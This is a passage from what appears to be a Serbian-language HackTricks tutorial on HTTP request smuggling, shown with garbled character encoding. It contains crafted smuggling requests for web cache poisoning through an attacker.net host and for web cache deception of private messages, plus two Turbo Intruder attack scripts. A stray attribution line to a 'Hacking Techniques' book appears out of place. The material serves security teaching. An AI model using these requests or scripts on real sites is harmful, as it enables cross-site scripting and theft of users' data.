- AÅ¾urirajte servere i proxy servere na najnovije verzije softvera kako biste ispravili poznate ranjivosti.
- KonfiguriÅ¡ite servere i proxy servere da pravilno interpretiraju HTTP zahteve i zaglavlja.
- Koristite Web Application Firewall (WAF) kako biste detektovali i blokirali HTTP Request Smuggling napade.
- Redovno pratite i analizirajte logove servera kako biste otkrili nepravilnosti ili sumnjive aktivnosti.

---

*Ovaj tekst je preuzet iz knjige "Hacking Techniques" autora Johna Smitha.*
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
U ovom scenariju, zahtev korisnika za JavaScript fajl je preuzet. NapadaÄ moÅ¾e potencijalno kompromitovati korisnika tako Å¡to Ä‡e posluÅ¾iti zlonamerni JavaScript kao odgovor.

### KoriÅ¡Ä‡enje HTTP zahteva za podmetanje kako bi se izvrÅ¡ilo trovanje keÅ¡a veb stranica <a href="#koriÅ¡Ä‡enje-http-zahteva-za-podmetanje-kako-bi-se-izvrÅ¡ilo-trovanje-keÅ¡a-veb-stranica" id="koriÅ¡Ä‡enje-http-zahteva-za-podmetanje-kako-bi-se-izvrÅ¡ilo-trovanje-keÅ¡a-veb-stranica"></a>

### IskoriÅ¡Ä‡avanje trovanja keÅ¡a veb stranica putem HTTP zahteva za podmetanje <a href="#iskoriÅ¡Ä‡avanje-trovanja-keÅ¡a-veb-stranica-putem-http-zahteva-za-podmetanje" id="iskoriÅ¡Ä‡avanje-trovanja-keÅ¡a-veb-stranica-putem-http-zahteva-za-podmetanje"></a>

Trovanje keÅ¡a veb stranica moÅ¾e se izvrÅ¡iti ako bilo koji deo **front-end infrastrukture keÅ¡ira sadrÅ¾aj**, obiÄno radi poboljÅ¡anja performansi. Manipulacijom odgovora servera, moguÄ‡e je **trovati keÅ¡**.

Ranije smo primetili kako se odgovori servera mogu izmeniti da bi vratili greÅ¡ku 404 (pogledajte [Osnovni primeri](./#osnovni-primeri)). SliÄno tome, moguÄ‡e je prevariti server da vrati sadrÅ¾aj `/index.html` kao odgovor na zahtev za `/static/include.js`. Kao rezultat toga, sadrÅ¾aj `/static/include.js` se zamenjuje u keÅ¡u sa sadrÅ¾ajem `/index.html`, Äime se onemoguÄ‡ava pristup `/static/include.js` korisnicima, Å¡to potencijalno moÅ¾e dovesti do DoS napada (Denial of Service).

Ova tehnika postaje posebno moÄ‡na ako se otkrije **ranjivost otvorenog preusmeravanja** ili ako postoji **preusmeravanje na otvoreno preusmeravanje na sajtu**. Takve ranjivosti mogu se iskoristiti da se zameni keÅ¡ sadrÅ¾aj `/static/include.js` sa skriptom pod kontrolom napadaÄa, Äime se omoguÄ‡ava Å¡iroko rasprostranjeni napad Cross-Site Scripting (XSS) protiv svih klijenata koji zahtevaju aÅ¾urirani `/static/include.js`.

Ispod je ilustracija iskoriÅ¡Ä‡avanja **trovanja keÅ¡a u kombinaciji sa preusmeravanjem na otvoreno preusmeravanje na sajtu**. Cilj je izmeniti keÅ¡ sadrÅ¾aj `/static/include.js` kako bi se posluÅ¾io JavaScript kodom koji kontroliÅ¡e napadaÄ:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Primetite ugraÄ‘eni zahtev koji cilja `/post/next?postId=3`. Ovaj zahtev Ä‡e biti preusmeren na `/post?postId=4`, koristeÄ‡i vrednost zaglavlja **Host** da bi odredio domen. Menjanjem **Host zaglavlja**, napadaÄ moÅ¾e preusmeriti zahtev na svoj domen (**on-site preusmeravanje na otvoreno preusmeravanje**).

Nakon uspeÅ¡nog **trovanja soketa**, treba pokrenuti **GET zahtev** za `/static/include.js`. Ovaj zahtev Ä‡e biti kontaminiran prethodnim zahtevom **on-site preusmeravanja na otvoreno preusmeravanje** i dobiÄ‡e sadrÅ¾aj skripte kojom napadaÄ upravlja.

Nakon toga, svaki zahtev za `/static/include.js` Ä‡e posluÅ¾iti keÅ¡irani sadrÅ¾aj skripte napadaÄa, efektivno pokreÄ‡uÄ‡i Å¡iroki XSS napad.


### KoriÅ¡Ä‡enje HTTP zahteva za krijumÄarenje kako bi se izvrÅ¡ila prevara keÅ¡a veb stranice <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Koja je razlika izmeÄ‘u trovanja keÅ¡a veb stranice i prevare keÅ¡a veb stranice?**
>
> * U **trovanju keÅ¡a veb stranice**, napadaÄ uzrokuje da aplikacija saÄuva zlonamerni sadrÅ¾aj u keÅ¡u, a taj sadrÅ¾aj se posluÅ¾uje iz keÅ¡a drugim korisnicima aplikacije.
> * U **prevari keÅ¡a veb stranice**, napadaÄ uzrokuje da aplikacija saÄuva neki osetljivi sadrÅ¾aj koji pripada drugom korisniku u keÅ¡u, a zatim napadaÄ preuzima taj sadrÅ¾aj iz keÅ¡a.

NapadaÄ kreira krijumÄareni zahtev koji dohvata osetljiv sadrÅ¾aj specifiÄan za korisnika. Razmotrite sledeÄ‡i primer:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Ako ovaj krijumÄareni zahtev zatrova keÅ¡ zapis namenjen statiÄkom sadrÅ¾aju (npr. `/someimage.png`), osetljivi podaci Å¾rtve iz `/private/messages` mogu biti keÅ¡irani pod keÅ¡ zapisom statiÄkog sadrÅ¾aja. Kao rezultat toga, napadaÄ bi potencijalno mogao povratiti ove keÅ¡irane osetljive podatke.

### OruÅ¾jevanje HTTP Request Smuggling-a sa HTTP Response Desynchronisation

Da li ste pronaÅ¡li neku ranjivost u HTTP Request Smuggling-u i ne znate kako da je iskoristite? PokuÅ¡ajte sa ovom drugom metodom iskoriÅ¡Ä‡avanja:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruder skripte

### CL.TE

Sa [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Od: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Alati

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Ovaj alat je gramatiÄki bazirani HTTP Fuzzer koristan za pronalaÅ¾enje nepravilnosti u zahtevima za Å¡vercovanje.

## Reference

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
